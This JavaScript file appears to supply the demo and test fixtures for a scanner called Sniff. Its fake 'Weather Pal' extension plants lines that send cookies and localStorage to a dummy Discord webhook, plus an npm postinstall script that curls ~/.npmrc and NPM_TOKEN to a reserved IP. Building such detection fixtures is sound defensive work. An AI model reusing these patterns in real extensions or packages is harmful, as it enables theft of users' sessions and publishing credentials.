/* Sniff - the two built-in samples. Both are FABRICATED fixtures written for
 * this app and labelled as such everywhere they appear. They exist so a
 * first-time visitor can see a real report, and so the tests have known
 * input. Nothing here is a real product, and the suspicious bits are
 * deliberately inert: the endpoints are reserved-for-documentation
 * (203.0.113.0/24, TEST-NET-3) or plainly fake, and the files are skeletal,
 * not working software.
 *
 * "Weather Pal" is a made-up browser extension plus a small npm build
 * helper. Most of it is ordinary; a few lines are planted so the report
 * shows findings beside benign code. `planted` lists what the tests check.
 *
 * "Tidy Tabs" is the clean sample - it talks to no network at all, so the
 * report shows what "nothing found" looks like (and that it still says
 * "read it").
 *
 * Each sample is entries in the shape the scanner reads ({path, text}), with
 * images, a lockfile and a node_modules entry so the "not read" list looks
 * like a real drop.
 */
(function (root, factory) {
  if (typeof module === 'object' && module.exports) module.exports = factory();
  else root.SniffDemo = factory();
}(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  function f(path, text) { return { path: path, text: text }; }

  // ---- Weather Pal (has findings) ----
  var manifest = JSON.stringify({
    manifest_version: 3,
    name: 'Weather Pal',
    version: '1.4.0',
    description: 'Your local forecast in a click.',
    homepage_url: 'https://weatherpal.example',
    permissions: ['cookies', 'storage', 'geolocation', 'alarms'],
    host_permissions: ['<all_urls>'],
    background: { service_worker: 'background.js' },
    content_scripts: [{ matches: ['<all_urls>'], js: ['content.js'], run_at: 'document_idle' }],
    action: { default_popup: 'popup.html' },
  }, null, 2) + '\n';

  var popup = [
    "// Weather Pal popup - the ordinary part: ask where you are, show a forecast.",
    "function show(data) { document.getElementById('temp').textContent = Math.round(data.current.temperature_2m) + '\\u00b0'; }",
    "navigator.geolocation.getCurrentPosition(function (pos) {",
    "  var lat = pos.coords.latitude.toFixed(2), lon = pos.coords.longitude.toFixed(2);",
    "  fetch('https://api.open-meteo.com/v1/forecast?latitude=' + lat + '&longitude=' + lon + '&current=temperature_2m')",
    "    .then(function (r) { return r.json(); }).then(show);",
    "});",
    "// A usage ping to its own site. Common, and low on its own.",
    "fetch('https://weatherpal.example/pulse', { method: 'POST', body: JSON.stringify({ v: '1.4.0' }) });",
    "",
  ].join('\n');

  // content.js - runs on every page. FABRICATED sample: the two planted lines
  // read the page's cookies and its stored data and hand them to the
  // background script. Inert fixture, not working software.
  var content = [
    "// Weather Pal content script (FABRICATED SAMPLE - inert, not a real tool)",
    "(function () {",
    "  var saved = document.cookie;",
    "  var everything = JSON.stringify(localStorage);",
    "  // handed off to background.js, which is where it leaves the browser",
    "  chrome.runtime.sendMessage({ kind: 'wp-sync', a: btoa(saved), b: btoa(everything) });",
    "})();",
    "",
  ].join('\n');

  // background.js - FABRICATED sample: receives the message and posts it to a
  // plainly fake Discord webhook. The URL is not real.
  var background = [
    "// Weather Pal background (FABRICATED SAMPLE - inert)",
    "var DROP = 'https://discord.com/api/webhooks/000000000000000000/FAKE-SAMPLE-TOKEN-not-real';",
    "chrome.runtime.onMessage.addListener(function (msg) {",
    "  if (msg && msg.kind === 'wp-sync') {",
    "    fetch(DROP, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });",
    "  }",
    "});",
    "chrome.alarms.create('refresh', { periodInMinutes: 60 });",
    "",
  ].join('\n');

  var popupHtml = [
    "<!doctype html><html><head><meta charset=\"utf-8\"><link rel=\"stylesheet\" href=\"popup.css\"></head>",
    "<body><div id=\"temp\">--</div><script src=\"popup.js\"></script></body></html>",
    "",
  ].join('\n');
  var popupJs = "document.title = 'Weather Pal';\n";

  var pkg = JSON.stringify({
    name: 'weather-pal',
    version: '1.4.0',
    private: true,
    scripts: {
      build: 'node scripts/bundle.js',
      postinstall: 'node scripts/setup.js',
      test: 'echo no tests',
    },
    dependencies: { 'tiny-emitter': '^2.1.0' },
    devDependencies: { esbuild: '^0.20.0' },
  }, null, 2) + '\n';

  // scripts/setup.js - FABRICATED sample: runs on `npm install` (postinstall)
  // and reads token files, then sends them to a reserved-range IP. Inert.
  var setup = [
    "// Weather Pal postinstall (FABRICATED SAMPLE - inert, reserved IP)",
    "var fs = require('fs');",
    "var cp = require('child_process');",
    "var os = require('os');",
    "var npmrc = '';",
    "try { npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch (e) {}",
    "var token = process.env.NPM_TOKEN || '';",
    "// 203.0.113.0/24 is TEST-NET-3, reserved for documentation - goes nowhere.",
    "cp.execSync('curl --data-binary @- http://203.0.113.9/collect', { input: npmrc + '\\n' + token });",
    "",
  ].join('\n');

  var bundle = "// Build helper: wraps the sources with esbuild. Nothing surprising here.\nrequire('esbuild').build({ entryPoints: ['content.js', 'background.js'], bundle: true, outdir: 'dist' });\n";

  var weatherEntries = [
    f('weather-pal/manifest.json', manifest),
    f('weather-pal/popup.html', popupHtml),
    f('weather-pal/popup.js', popupJs),
    f('weather-pal/popup/forecast.js', popup),
    f('weather-pal/content.js', content),
    f('weather-pal/background.js', background),
    f('weather-pal/package.json', pkg),
    f('weather-pal/scripts/setup.js', setup),
    f('weather-pal/scripts/bundle.js', bundle),
    f('weather-pal/popup.css', 'body{font:14px system-ui;width:220px}#temp{font-size:48px}'),
    f('weather-pal/icons/icon-128.png', 'PNG-PLACEHOLDER'),
    f('weather-pal/icons/icon-48.png', 'PNG-PLACEHOLDER'),
    f('weather-pal/package-lock.json', '{ "name": "weather-pal", "lockfileVersion": 3, "packages": {} }'),
    f('weather-pal/node_modules/tiny-emitter/index.js', 'module.exports = function(){};'),
    f('weather-pal/README.md', '# Weather Pal\n\nYour local forecast in a click.\n'),
  ];

  // ---- Tidy Tabs (clean) ----
  var tidyManifest = JSON.stringify({
    manifest_version: 3,
    name: 'Tidy Tabs',
    version: '0.3.1',
    description: 'Group your tabs by site, in one click.',
    permissions: ['tabs', 'tabGroups', 'storage'],
    action: { default_popup: 'popup.html' },
  }, null, 2) + '\n';
  var tidyPopup = [
    "// Tidy Tabs - groups the open tabs by their site. No network, nothing stored off-device.",
    "async function group() {",
    "  var tabs = await chrome.tabs.query({ currentWindow: true });",
    "  var bySite = {};",
    "  for (var i = 0; i < tabs.length; i++) {",
    "    var host = new URL(tabs[i].url).hostname.replace(/^www\\./, '');",
    "    (bySite[host] = bySite[host] || []).push(tabs[i].id);",
    "  }",
    "  for (var host in bySite) {",
    "    if (bySite[host].length < 2) continue;",
    "    var g = await chrome.tabs.group({ tabIds: bySite[host] });",
    "    await chrome.tabGroups.update(g, { title: host });",
    "  }",
    "}",
    "chrome.storage.local.get('autogroup', function (s) { if (s.autogroup) group(); });",
    "document.getElementById('go').addEventListener('click', group);",
    "",
  ].join('\n');
  var tidyEntries = [
    f('tidy-tabs/manifest.json', tidyManifest),
    f('tidy-tabs/popup.html', "<!doctype html><html><head><meta charset=\"utf-8\"></head><body><button id=\"go\">Tidy</button><script src=\"popup.js\"></script></body></html>\n"),
    f('tidy-tabs/popup.js', tidyPopup),
    f('tidy-tabs/options.js', "chrome.storage.local.get('autogroup', function (s) { document.getElementById('a').checked = !!s.autogroup; });\ndocument.getElementById('a').addEventListener('change', function (e) { chrome.storage.local.set({ autogroup: e.target.checked }); });\n"),
    f('tidy-tabs/icon.png', 'PNG-PLACEHOLDER'),
    f('tidy-tabs/README.md', '# Tidy Tabs\n\nGroup your tabs by site.\n'),
  ];

  var planted = {
    // the flow that matters: cookies + storage -> Discord, across two scripts
    flowFile: 'background.js',
    flowDest: 'discord.com',
    install: 'scripts/setup.js',
    installDest: '203.0.113.9',
    credFile: 'scripts/setup.js',
    benignFetch: 'popup/forecast.js',
    permAllUrls: 'manifest.json',
  };

  function weather() { return { source: 'demo', name: 'Weather Pal', kind: 'extension', entries: weatherEntries.slice() }; }
  function tidy() { return { source: 'demo', name: 'Tidy Tabs', kind: 'extension', entries: tidyEntries.slice() }; }

  return { weather: weather, tidy: tidy, planted: planted, WEATHER: weatherEntries, TIDY: tidyEntries };
}));
